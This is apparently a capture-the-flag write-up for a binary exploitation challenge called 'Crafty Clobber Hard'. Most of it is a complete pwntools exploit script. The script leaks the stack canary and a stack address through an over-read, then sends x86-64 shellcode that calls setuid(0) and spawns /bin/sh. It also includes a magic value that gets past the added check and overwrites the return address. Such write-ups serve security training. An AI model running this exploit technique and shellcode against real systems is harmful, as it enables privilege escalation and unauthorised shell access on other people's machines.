![](img/A%20Crafty%20Clobber%20Hard-1780626858877.webp)
![](img/A%20Crafty%20Clobber%20Hard-1780626979558.webp)
inspecting the pseudo code and the vmmap, we acknowledge that this challenge is a copy of [Canary Conundrum Hard](Canary%20Conundrum%20Hard.md) with an extra checker at the end

this means 2 things:
	
	1. The solution is almost the same as [Canary Conundrum Hard](Canary%20Conundrum%20Hard.md)

	2. we have 0x28 bytes for our setuid and shell-spawning code (see the location of buf and v10)

```
payload = asm("""
xor rdi, rdi
mov rax, 105
syscall
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
""")
```
looking at the old code, we acknowledge that we wasted space for 'mov' instead of 'push' and 'pop'
fixing that a bit and we can fit a neatly 0x28 bytes code that spawn a shell and letting us read the flag manually
```
#!/usr/bin/python3

from pwn import *

context.arch="amd64"
context.os="linux"
context.log_level="debug"

def slog(name , addr):
    return success(': '.join([name, hex(addr)]))
# while True:

#     try:
#         p.sendline(b'id')
#         p.recvuntil(b'uid=' , timeout=1.5)
#         break
#     except:
#         pass
p=process("../crafty-clobber-hard")

payload=b"REPEAT" + b"A"*(0x39-0x6)
p.recvuntil("Payload size: ")
p.sendline(str(len(payload)).encode())
p.recvuntil("bytes)!")
p.send(payload)

zz = p.recvuntil(b"Backdoor")
dat=zz.split(b"You said: ",1)[1]
dat=dat[len(payload):]
canary=b"\x00"+dat[:7]

payload=b"REPEAT" + b"A"*(0x38-0x6+0x8)
p.recvuntil("Payload size: ")
p.sendline(str(len(payload)).encode())
p.recvuntil("bytes)!")
p.send(payload)

zz = p.recvuntil(b"Backdoor")
dat=zz.split(b"You said: ",1)[1]
dat=dat[len(payload):]
temp=dat[:6]

addr = u64(temp + b'\x00' * 2)

# print(p64(addr))
print(hex(addr))

addr=addr-0x160

# print(p64(addr))
print(hex(addr))

# pause()

payload = asm("""
xor rdi, rdi
mov rax, 105
syscall
mov rdi, 0x68732f6e69622f
push rdi
push rsp
pop rdi
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
""")

print(hex(len(payload)))
# payload+=b"\x00"
payload = payload.ljust(0x28)
# payload += bytes.fromhex("4FCDDBA66C61AFB1")
payload += bytes.fromhex("b1af616ca6dbcd4f")
payload = payload.ljust(0x38)
payload += canary + b"\x20"*8 + p64(addr)
p.recvuntil("Payload size: ")
# pause()
p.sendline(str(len(payload)).encode())
p.recvuntil("bytes)!")
p.send(payload)

p.interactive()
```